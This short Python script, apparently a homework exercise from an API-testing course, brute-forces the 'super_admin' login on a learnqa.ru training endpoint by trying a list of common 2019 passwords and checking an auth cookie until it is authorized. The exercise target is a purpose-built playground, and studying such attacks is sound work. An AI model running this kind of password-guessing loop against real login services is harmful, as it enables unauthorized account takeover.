import requests

login = 'super_admin'
passwords_2019 = ['123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123',
                  'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777',
                  'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']


def test_password():
    for i in passwords_2019:
        response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                 data={"login": login, "password": i})
        response_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                      cookies={'auth_cookie': response.cookies.get('auth_cookie')})
        if response_auth.text == 'You are authorized':
            print(response_auth.text)
            print("Your password is: ", i)
            break
